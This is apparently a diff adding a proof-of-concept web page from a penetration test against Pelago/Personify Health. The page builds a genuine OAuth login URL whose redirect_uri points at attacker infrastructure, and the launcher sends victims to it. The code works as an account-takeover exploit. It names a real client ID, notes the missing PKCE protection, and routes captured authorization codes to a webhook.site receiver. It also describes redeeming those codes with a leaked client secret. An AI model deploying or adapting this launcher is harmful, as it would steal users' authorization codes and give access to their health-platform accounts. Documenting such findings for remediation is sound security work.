@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="robots" content="noindex, nofollow" />
+<meta name="referrer" content="no-referrer" />
+<title>Continue to Pelago</title>
+<!--
+  ===========================================================================
+  PELAGO ENGAGEMENT  ·  PELAGO-IN-08 PoC  ·  AUTHORIZED TEST ARTIFACT
+  Page 1 of 2  —  LAUNCHER
+
+  Purpose: build the `pif-pelago` OAuth authorize URL whose `redirect_uri`
+  points at attacker-controlled infrastructure, then send the victim there.
+
+  Deploy target: GitHub Pages (public repo). See README.md.
+
+  Scope note: this artifact only *builds a URL* and navigates. The login
+  itself happens on the genuine Personify Health page and nothing is captured
+  on that page. Credential-equivalent material (the ?code=) is delivered to
+  callback.html / the webhook receiver after the victim authenticates.
+  ===========================================================================
+-->
+<style>
+  :root{--ink:#0f172a;--muted:#64748b;--brand:#0b7a6f;--bg:#f8fafc;--line:#e2e8f0;}
+  *{box-sizing:border-box;}
+  body{margin:0;font:16px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--ink);background:var(--bg);}
+  .banner{background:#7c2d12;color:#fff;padding:10px 16px;font-size:13px;}
+  .banner b{text-transform:uppercase;letter-spacing:.08em;}
+  .wrap{max-width:760px;margin:0 auto;padding:48px 20px 96px;}
+  h1{font-size:26px;margin:0 0 6px;}
+  p.lede{color:var(--muted);margin:0 0 24px;}
+  .card{background:#fff;border:1px solid var(--line);border-radius:14px;padding:28px;margin-top:20px;box-shadow:0 1px 2px rgba(15,23,42,.04);}
+  .btn{display:inline-flex;align-items:center;gap:10px;background:var(--brand);color:#fff;border:0;border-radius:10px;padding:14px 22px;font-size:16px;font-weight:600;cursor:pointer;}
+  .btn:hover{filter:brightness(1.07);}
+  .btn.ghost{background:#fff;color:var(--ink);border:1px solid var(--line);font-weight:500;}
+  .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;}
+  details{margin-top:18px;border:1px solid var(--line);border-radius:10px;background:#fff;}
+  summary{cursor:pointer;padding:12px 16px;font-weight:600;font-size:14px;}
+  .pad{padding:0 16px 16px;}
+  code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12.5px;}
+  pre{background:#0f172a;color:#e2e8f0;padding:14px;border-radius:8px;overflow:auto;white-space:pre-wrap;word-break:break-all;}
+  table{width:100%;border-collapse:collapse;font-size:13px;}
+  td{border-bottom:1px solid var(--line);padding:6px 4px;vertical-align:top;}
+  td:first-child{color:var(--muted);white-space:nowrap;padding-right:12px;width:170px;}
+  ol{padding-left:20px;font-size:14px;color:#334155;}
+  .pill{display:inline-block;background:#ecfdf5;color:#047857;border:1px solid #a7f3d0;border-radius:999px;padding:1px 9px;font-size:11.5px;font-weight:600;}
+</style>
+</head>
+<body>
+<div class="banner" id="banner">
+  <b>Authorized penetration test</b> — Pelago engagement 2026-09-28 → 10-02 · finding <code>PELAGO-IN-08</code>.
+  Reproduction artifact only; not a real Pelago service. Set <code>POC_BANNER=false</code> below to hide this strip.
+</div>
+
+<div class="wrap">
+  <h1>Continue to Pelago</h1>
+  <p class="lede">Clicking the button sends the browser to the <b>genuine</b> Personify Health sign-in page
+  (<code>login.personifyhealth.com</code>) carrying an <b>attacker-controlled <code>redirect_uri</code></b>.</p>
+
+  <div class="card">
+    <div class="row">
+      <button class="btn" id="go">Continue with Pelago&nbsp;&rarr;</button>
+      <button class="btn ghost" id="copy">Copy authorize URL</button>
+    </div>
+    <p style="font-size:13px;color:var(--muted);margin:16px 0 0;">
+      Receiver in use: <code id="wh"></code> <span class="pill" id="st"></span>
+    </p>
+  </div>
+
+  <details open>
+    <summary>Authorize request this page will send</summary>
+    <div class="pad">
+      <table id="tbl"></table>
+      <pre id="url"></pre>
+    </div>
+  </details>
+
+  <details>
+    <summary>What happens next</summary>
+    <div class="pad">
+      <ol>
+        <li>Browser navigates to Personify's real login page — genuine domain, certificate and branding.</li>
+        <li>The user authenticates normally. Nothing is captured on that page.</li>
+        <li>Personify redirects the browser to <code id="ru2"></code> with <code>?code=&hellip;&amp;state=&hellip;</code>.</li>
+        <li><code>callback.html</code> forwards the authorization code to the webhook receiver.</li>
+        <li><code>redeem_poc_tokens.sh</code> exchanges the code for a live token using the leaked client secret.</li>
+      </ol>
+    </div>
+  </details>
+</div>
+
+<script>
+/* ------------------------------------------------------------------ config */
+
+const POC_BANNER = true;   // set false to hide the red test strip
+
+const CFG = {
+  AUTH_URL : "https://login.personifyhealth.com/auth/realms/platform/protocol/openid-connect/auth",
+  CLIENT_ID: "pif-pelago",
+  SCOPE    : "events offline_access",     // exactly what Pelago's own signup bundle requests
+  SPONSOR_ID: "11795",
+
+  /* Where the authorization response is delivered.
+     - default: relative callback.html  -> victim stays on the attacker origin (realistic)
+     - alternative: put your webhook.site URL here to deliver ?code= straight to the inbox   */
+  REDIRECT_URI: new URL("callback.html", location.href).href,
+
+  /* Receiver supplied by the tester. */
+  WEBHOOK: "https://webhook.site/e3723f3f-7400-4d86-9de0-ed9b8ab48aeb",
+
+  /* NOTE: Pelago's own bundle builds this URL with an extra
+     `client_secret=VITE_PERSONIFY_CLIENT_SECRET` parameter in the front
+     channel. It is NOT required here — our probes sent no secret and still
+     received 302 — so it is deliberately omitted from this published file.
+     The value lives in the engagement report and in the local redeem script. */
+
+  /* pif-pelago is not PKCE-protected (authorize without code_challenge succeeds).
+     Flip to true only if a future configuration starts requiring it.        */
+  USE_PKCE: false
+};
+
+/* ------------------------------------------------------------------ helpers */
+
+if (!POC_BANNER) document.getElementById('banner').style.display = 'none';
+document.getElementById('wh').textContent = CFG.WEBHOOK;
+
+const b64url = bytes =>
+  btoa(String.fromCharCode(...new Uint8Array(bytes)))
+    .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+
+/* Storage is best-effort: some contexts (file://, hardened privacy modes) throw. */
+const save = (k, v) => {
+  try { (v === null || v === undefined) ? localStorage.removeItem(k) : localStorage.setItem(k, v); }
+  catch (e) { /* non-fatal: callback falls back to defaults */ }
+};
+
+function randomState(){
+  const a = new Uint8Array(16); crypto.getRandomValues(a);
+  return 'pelago-poc-' + [...a].map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+async function makePkce(){
+  const v = new Uint8Array(32); crypto.getRandomValues(v);
+  const verifier  = b64url(v);
+  const challenge = b64url(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier)));
+  return { verifier, challenge };
+}
+
+async function buildAuthorizeUrl(){
+  const state  = randomState();
+  const params = new URLSearchParams({
+    client_id    : CFG.CLIENT_ID,
+    response_type: 'code',
+    scope        : CFG.SCOPE,
+    redirect_uri : CFG.REDIRECT_URI,
+    state
+  });
+
+  let verifier = null;
+  if (CFG.USE_PKCE) {
+    const p = await makePkce();
+    verifier = p.verifier;
+    params.set('code_challenge', p.challenge);
+    params.set('code_challenge_method', 'S256');
+  }
+  /* Hand the callback page everything it needs to correlate + report. */
+  save('pelago_poc_state',        state);
+  save('pelago_poc_webhook',      CFG.WEBHOOK);
+  save('pelago_poc_redirect_uri', CFG.REDIRECT_URI);
+  save('pelago_poc_token_url',    CFG.AUTH_URL.replace(/\/auth$/, '/token'));
+  save('pelago_poc_verifier',     verifier);
+
+  return { url: CFG.AUTH_URL + '?' + params.toString(), params, state };
+}
+
+/* ------------------------------------------------------------------ render */
+
+let CURRENT = null;
+
+function render({ url, params, state }){
+  const rows = [
+    ['Endpoint',        CFG.AUTH_URL],
+    ['client_id',       CFG.CLIENT_ID],
+    ['response_type',   params.get('response_type')],
+    ['scope',           params.get('scope')],
+    ['redirect_uri',    params.get('redirect_uri')],
+    ['state',           state],
+    ['client_secret',   'omitted — not required at authorize (the app sends it; see README)'],
+    ['PKCE',            params.get('code_challenge') ? 'S256 challenge sent' : 'not used — client is not PKCE-protected']
+  ];
+  document.getElementById('tbl').innerHTML = rows
+    .map(([k,v]) => `<tr><td>${k}</td><td><code>${String(v).replace(/</g,'&lt;')}</code></td></tr>`).join('');
+  document.getElementById('url').textContent = url;
+  document.getElementById('ru2').textContent = params.get('redirect_uri');
+  document.getElementById('st').textContent = 'ready';
+}
+
+(async function init(){
+  CURRENT = await buildAuthorizeUrl();
+  render(CURRENT);
+})();
+
+/* ------------------------------------------------------------------ actions */
+
+document.getElementById('go').addEventListener('click', async () => {
+  document.getElementById('st').textContent = 'redirecting…';
+  location.href = CURRENT.url;   // -> genuine Personify login, with our redirect_uri
+});
+
+document.getElementById('copy').addEventListener('click', async () => {
+  await navigator.clipboard.writeText(CURRENT.url);
+  document.getElementById('st').textContent = 'URL copied';
+  setTimeout(() => document.getElementById('st').textContent = 'ready', 1500);
+});
+</script>
+</body>
+</html>
